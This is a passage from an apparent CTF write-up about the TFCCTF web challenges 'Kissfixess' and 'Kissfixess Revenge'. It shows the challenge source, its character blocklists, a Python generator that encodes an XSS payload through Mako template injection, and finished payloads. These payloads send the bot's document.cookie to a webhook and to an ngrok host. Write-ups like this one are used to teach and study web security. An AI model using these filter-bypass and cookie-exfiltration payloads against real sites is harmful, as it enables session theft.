+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#fe8019">...&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#fe8019">...&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> driver&lt;span style="color:#fe8019">.&lt;/span>add_cookie({
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#b8bb26">&amp;#34;flag&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#b8bb26">&amp;#34;TFCCTF{~}&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> })
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encoded_name &lt;span style="color:#fe8019">=&lt;/span> quote(name)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> driver&lt;span style="color:#fe8019">.&lt;/span>get(&lt;span style="color:#b8bb26">f&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>URL_BASE&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">/?name_input=&lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>encoded_name&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># allow some time for JS to execute&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#fe8019">.&lt;/span>sleep(&lt;span style="color:#d3869b">200&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> driver&lt;span style="color:#fe8019">.&lt;/span>quit()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is inside the cookie of this bot. We have to leak it via XSS. But some characters are filtered from the &lt;code>input_name&lt;/code> parameter:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>banned &lt;span style="color:#fe8019">=&lt;/span> [&lt;span style="color:#b8bb26">&amp;#34;s&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;l&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;(&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;)&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;self&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;_&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;.&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">\\&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;import&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;eval&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;exec&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;os&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;,&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;|&amp;#34;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">escape_html&lt;/span>(text):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Escapes HTML special characters in the given text.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> text&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;amp;&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;lt;&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;&amp;gt;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;gt;&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;(&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;#40;&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;)&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;#41;&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">render_page&lt;/span>(name_to_display&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">None&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Renders the HTML page with the given name.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> templ &lt;span style="color:#fe8019">=&lt;/span> html_template&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;NAME&amp;#34;&lt;/span>, escape_html(name_to_display &lt;span style="color:#fe8019">or&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> template &lt;span style="color:#fe8019">=&lt;/span> Template(templ, lookup&lt;span style="color:#fe8019">=&lt;/span>lookup)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> template&lt;span style="color:#fe8019">.&lt;/span>render(name_to_display&lt;span style="color:#fe8019">=&lt;/span>name_to_display, banned&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;lt;&amp;gt;()&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">class&lt;/span> SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">do_GET&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Parse the path and extract query parameters&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parsed_url &lt;span style="color:#fe8019">=&lt;/span> urlparse(self&lt;span style="color:#fe8019">.&lt;/span>path)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> params &lt;span style="color:#fe8019">=&lt;/span> parse_qs(parsed_url&lt;span style="color:#fe8019">.&lt;/span>query)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#fe8019">=&lt;/span> params&lt;span style="color:#fe8019">.&lt;/span>get(&lt;span style="color:#b8bb26">&amp;#34;name_input&amp;#34;&lt;/span>, [&lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span>])[&lt;span style="color:#d3869b">0&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> b &lt;span style="color:#fe8019">in&lt;/span> banned:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> b &lt;span style="color:#fe8019">in&lt;/span> name:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Banned characters detected!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(b)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#fe8019">...&lt;/span>]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Even characters like &lt;code>s&lt;/code> and &lt;code>l&lt;/code> are blocked. The server uses &lt;code>mako&lt;/code> template engine and since &lt;code>${}&lt;/code> characters are not in the banned list we can try template injection:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903140548.webp">&lt;/figure>
+&lt;p>Even though template injection works, we can&amp;rsquo;t escalate it into RCE. But what we can do is to try generating an XSS payload using some python quirks.
+We can construct characters using &lt;code>%c&lt;/code> format string. &lt;code>${'%c'%60}&lt;/code> will produce &lt;code>&amp;lt;&lt;/code>:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903140853.webp">&lt;/figure>
+&lt;p>I made a script that will generate the payload for a given string:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>banned &lt;span style="color:#fe8019">=&lt;/span> [&lt;span style="color:#b8bb26">&amp;#34;s&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;l&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;(&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;)&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;_&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;.&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;&amp;#39;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">\\&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;;&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;,&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;|&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;&amp;gt;&amp;#34;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;lt;script&amp;gt;fetch(&amp;#39;http://WEBHOOK/?c=&amp;#39;+document.cookie)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>final_payload &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> i &lt;span style="color:#fe8019">in&lt;/span> payload:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> i &lt;span style="color:#fe8019">in&lt;/span> banned:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fabd2f">str&lt;/span>(&lt;span style="color:#fabd2f">ord&lt;/span>(i))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> final_payload &lt;span style="color:#fe8019">+=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;${&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;%&amp;#34;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> val &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> final_payload &lt;span style="color:#fe8019">+=&lt;/span> i
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">print&lt;/span>(final_payload)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I used &lt;code>ngrok&lt;/code> and &lt;code>nc&lt;/code> as the web hook. Final payload looks like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">60&lt;/span>}${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">115&lt;/span>}cript${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">62&lt;/span>}fetch${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">40&lt;/span>}&lt;span style="color:#b8bb26">&amp;#39;http://0${&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>c&lt;span style="color:#b8bb26">&amp;#39;%46}tcp${&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>c&lt;span style="color:#b8bb26">&amp;#39;%46}in${&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>c&lt;span style="color:#b8bb26">&amp;#39;%46}ngrok${&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>c&lt;span style="color:#b8bb26">&amp;#39;%46}io:11938/?c=&amp;#39;&lt;/span>&lt;span style="color:#fe8019">+&lt;/span>document${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">46&lt;/span>}cookie${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">41&lt;/span>}${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">60&lt;/span>}&lt;span style="color:#fe8019">/&lt;/span>${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">115&lt;/span>}cript${&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">%c&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&lt;/span>&lt;span style="color:#fe8019">%&lt;/span>&lt;span style="color:#d3869b">62&lt;/span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have to report this payload to the bot and it will leak the flag:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903141539.webp">&lt;/figure>
+&lt;h2 id="kissfixess-revenge">Kissfixess Revenge&lt;/h2>
+&lt;blockquote>
+&lt;p>Okay, NOW ain&amp;rsquo;t nobody gonna solve it.&lt;/p>
+&lt;/blockquote>
+&lt;p>This follows the same format as before, but with some more added characters to the filter. The &lt;code>banned&lt;/code> list now include &lt;code>%&lt;/code> as well:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>banned &lt;span style="color:#fe8019">=&lt;/span> [&lt;span style="color:#b8bb26">&amp;#34;s&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;l&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;(&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;)&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;self&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;_&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;.&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">\\&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;%&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;^&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;#&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;@&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;!&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;*&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;-&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;import&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;eval&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;exec&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;os&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;;&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;,&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;|&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;JAVASCRIPT&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;window&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;atob&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;btoa&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;=&amp;#34;&lt;/span>]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And it also checks the code contains &lt;code>.&lt;/code> character after rendering the template with our input:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">render_page&lt;/span>(name_to_display&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">None&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Renders the HTML page with the given name.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> templ &lt;span style="color:#fe8019">=&lt;/span> html_template&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;NAME&amp;#34;&lt;/span>, name_to_display &lt;span style="color:#fe8019">or&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> template &lt;span style="color:#fe8019">=&lt;/span> Template(templ, lookup&lt;span style="color:#fe8019">=&lt;/span>lookup)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tp &lt;span style="color:#fe8019">=&lt;/span> template&lt;span style="color:#fe8019">.&lt;/span>render(name_to_display&lt;span style="color:#fe8019">=&lt;/span>name_to_display, banned&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;lt;&amp;gt;()&amp;#34;&lt;/span>, copyright&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>, help&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>, quit&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tp_data &lt;span style="color:#fe8019">=&lt;/span> tp&lt;span style="color:#fe8019">.&lt;/span>split(&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;div class=&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">rainbow-text&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;gt;&amp;#34;&lt;/span>)[&lt;span style="color:#d3869b">1&lt;/span>]&lt;span style="color:#fe8019">.&lt;/span>split(&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;/div&amp;gt;&amp;#34;&lt;/span>)[&lt;span style="color:#d3869b">0&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.&amp;#34;&lt;/span> &lt;span style="color:#fe8019">in&lt;/span> tp_data &lt;span style="color:#fe8019">or&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;href&amp;#34;&lt;/span> &lt;span style="color:#fe8019">in&lt;/span> tp_data&lt;span style="color:#fe8019">.&lt;/span>lower():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Banned characters detected!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">except&lt;/span> &lt;span style="color:#fb4934">IndexError&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Something went wrong!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> tp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We need &lt;code>.&lt;/code> in our payload for adding in our web hook. The code only checks the value inside: &lt;code>&amp;lt;div class=&amp;quot;rainbow-text&amp;quot;&amp;gt;&lt;/code> and &lt;code>&amp;lt;/div&amp;gt;&lt;/code> based on the assumption that the rendered html code will follow this format:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#fb4934">div&lt;/span> &lt;span style="color:#b8bb26;font-weight:bold">class&lt;/span>&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;rainbow-text&amp;#34;&lt;/span>&amp;gt;NAME&amp;lt;/&lt;span style="color:#fb4934">div&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Where name will be replaced with the user input. But if we gave it an input like: &lt;code>hi&amp;lt;/div&amp;gt;&amp;lt;Script&amp;gt;...&amp;lt;/Script&amp;gt;&lt;/code>, the &lt;code>tp_data&lt;/code> variable will only take &lt;code>hi&lt;/code> as the user input and checks for &lt;code>.&lt;/code> inside this string.
+So by prefixing our payload with an extra &lt;code>&amp;lt;/div&amp;gt;&lt;/code> will help us bypass this check. But this is not enough, the &lt;code>.&lt;/code> character is also inside the &lt;code>banned&lt;/code> list. So we still have to generate it somehow.
+This can be done using &lt;code>String['fromCharCode'](46)&lt;/code> in javascript.
+Now we can&amp;rsquo;t use &lt;code>%&lt;/code> character to generate rest of the blocked character like we did in the previous challenge. But we don&amp;rsquo;t really have to generate every character like this. The banned list is only blocking &lt;code>s&lt;/code>, we can still use &lt;code>S&lt;/code> for the script tag since html is case insensitive. Characters like &lt;code>&amp;lt;&amp;gt;()&lt;/code> are directly passed to the &lt;code>banned&lt;/code> variable when rendering the template:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>tp &lt;span style="color:#fe8019">=&lt;/span> template&lt;span style="color:#fe8019">.&lt;/span>render(name_to_display&lt;span style="color:#fe8019">=&lt;/span>name_to_display, banned&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&amp;amp;&amp;lt;&amp;gt;()&amp;#34;&lt;/span>, copyright&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>, help&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>, quit&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;haha&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can access the &lt;code>banned&lt;/code> variable defined here inside mako template. &lt;code>${banned[1]}&lt;/code> will produce &lt;code>&amp;lt;&lt;/code> and so on.
+With this we can easily create a working payload:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;hi&amp;lt;/div&amp;gt;&amp;lt;script&amp;gt;fetch(&amp;#39;http://0.tcp.in.ngrok.io:17940/?&amp;#39;+document[&amp;#39;cookie&amp;#39;])&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>
